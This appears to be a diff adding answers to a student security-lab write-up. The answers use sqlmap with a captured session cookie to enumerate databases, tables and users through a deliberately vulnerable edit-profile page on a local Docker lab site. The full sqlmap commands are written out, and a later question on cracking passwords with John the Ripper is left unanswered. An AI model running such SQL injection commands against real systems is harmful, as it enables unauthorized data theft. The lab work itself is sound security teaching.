@@ -227,13 +227,71 @@ docker-compose up --build
 git clone https://github.com/sqlmapproject/sqlmap
 ```
 
-**Question 1**: Use sqlmap to get information about all available databases
+**Question 1**: Use sqlmap to get information about all available databases\
 **Answer 1**:
 
+## 1. Open and login to <http://localhost:3128/>:
 
+Open browser and enter <http://localhost:3128/> then login it with user account.
 
-**Question 2**: Use sqlmap to get tables, users information
+![2_login](./img/2_login.png)
+
+usernme: `seedsamy`
+password: `seedsamy`
+
+## 2. Edit profile of user:
+
+![2_network](./img/2_network.png)
+
+First, you need to open the **Developer Tools** on browser by Right-Click and select Inspect Element, then Choose **Network** tab on Developer Tools.
+
+![2_edit](./img/2_edit.png)
+
+Click on to `Edit Profile` button and then fill all the box with information.
+
+After all, click `save`.
+
+## 3. Watch the package sent by browser:
+
+![2_sent](./img/2_network_sent.png)
+
+At the network tab, you should have a `.php` GET package. That will have the cookie of user.
+
+![2_payload](./img/2_payload.png)
+
+In the payload, you should have all information that you've sent in Edit Profile session.
+
+## 4. Now use sqlmap to find all available databases:
+
+Now open sqlmap in command prompt, your input have the following form:
+
+`python sqlmap.py -u "url" --cookie="user_cookie" --data="payload_data" --dbs `
+
+In my case, the command could be:
+
+```sh
+py sqlmap.py -u "http://localhost:3128/unsafe_edit_backend.php?NickName=Huy&Email=huy%40gmail.com&Address=1111&PhoneNumber=0829174988&Password=huy" --cookie="PHPSESSID=lq8dlk5c5o88k1gejsr5k04jc9; security=medium" --dbs
+```
+
+![dbs](./img/2_dbs.png)
+
+Conclusion: You can use sql to extract databases from vulnarable database/website.
+
+**Question 2**: Use sqlmap to get tables, users information\
 **Answer 2**:
 
-**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+## 5. Use sql map to find all tables and user information:
+
+```sh
+py sqlmap.py -u "http://localhost:3128/unsafe_edit_backend.php?NickName=Huy&Email=huy%40gmail.com&Address=1111&PhoneNumber=0829174988&Password=huy" --cookie="PHPSESSID=lq8dlk5c5o88k1gejsr5k04jc9; security=medium" --tables
+```
+
+![table](./img/2_table.png)
+
+```sh
+py sqlmap.py -u "http://localhost:3128/unsafe_edit_backend.php?NickName=Huy&Email=huy%40gmail.com&Address=1111&PhoneNumber=0829174988&Password=huy" --cookie="PHPSESSID=lq8dlk5c5o88k1gejsr5k04jc9; security=medium" --users
+```
+
+**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit\
 **Answer 3**:
+
